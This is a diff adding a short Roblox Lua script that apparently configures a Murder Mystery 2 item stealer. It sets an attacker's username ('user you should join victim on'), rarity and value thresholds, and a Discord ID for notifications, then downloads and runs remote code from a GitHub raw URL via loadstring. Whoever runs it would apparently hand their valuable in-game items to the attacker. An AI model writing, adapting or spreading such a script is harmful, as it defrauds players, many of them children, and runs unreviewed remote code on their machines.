@@ -1,0 +1,7 @@
+_G.Username = "donationsmm21" -- user you should join victim on
+_G.min_rarity = "Godly"
+_G.min_value = 10 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "717606239764217866" -- change to your discord id
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/toofasthub1/mm2v2/refs/heads/main/wdadw'))()
